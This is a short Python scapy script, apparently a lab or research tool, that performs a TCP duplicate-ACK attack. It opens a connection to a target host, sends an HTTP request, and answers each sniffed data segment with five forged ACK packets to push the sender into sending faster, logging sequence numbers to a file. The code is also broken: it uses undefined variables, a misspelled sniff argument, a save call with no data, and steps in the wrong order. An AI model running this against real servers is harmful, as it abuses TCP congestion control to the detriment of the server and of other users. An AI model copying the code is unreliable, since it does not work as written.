#! /usr/bin/env python
from scapy.all import *
import sys
import numpy as np
import subprocess as sp

IP_DST = sys.argv[1]
DST_PORT =  int(sys.argv[2])
IP_SRC = None
IP_SRC_PORT = None
data = list()
startSeqNo = 0
FileName = "dupACK.npy"

def addACKs(pkt):
  global DST_PORT, IP_DST, startSeqNo, data
  data.append((pkt.time, pkt[TCP].seq - startSeqNo))
  ip_total_len = pkt.getlayer(IP).len
  ip_header_len = pkt.getlayer(IP).ihl * 32 / 8
  tcp_header_len = pkt.getlayer(TCP).dataofs * 32 / 8
  tcp_seg_len = ip_total_len - ip_header_len - tcp_header_len
  ACKnum = pkt[TCP].seq + tcp_seg_len
  pkt = IP(dst=IP_DST) / TCP(dport=IP_DST_PORT, flags='A', ack=ACKnum)
  send(pkt, count=5)

def pktFilter(pkt):
  global IP_SRC, IP_DST, SRC_PORT, DST_PORT
  return pkt[IP].src == IP_DST and pkt[IP].dst == IP_SRC and pkt[TCP].dport == SRC_PORT and pkt[TCP].sport == DST_PORT

syn = IP(dst=IP_DST) / TCP(dport=IP_DST_PORT, flags='S')
IP_SRC = syn[IP].src
SRC_PORT = syn[TCP].sport
startSeqNo = syn[TCP].seq
syn_ack = sr1(syn)
getStr = 'GET / HTTP/1.1\r\n\r\n'
request = IP(dst=IP_DST) / TCP(dport=IP_DST_PORT, sport=syn_ack[TCP].dport,
             seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='A') / getStr
sniff(prn=addACKs, lfiter=pktFilter)
reply = sr(request)
np.asarray(zip(*data))
sp.call(["rm", "-f", FileName], shell=True)
np.save(FileName)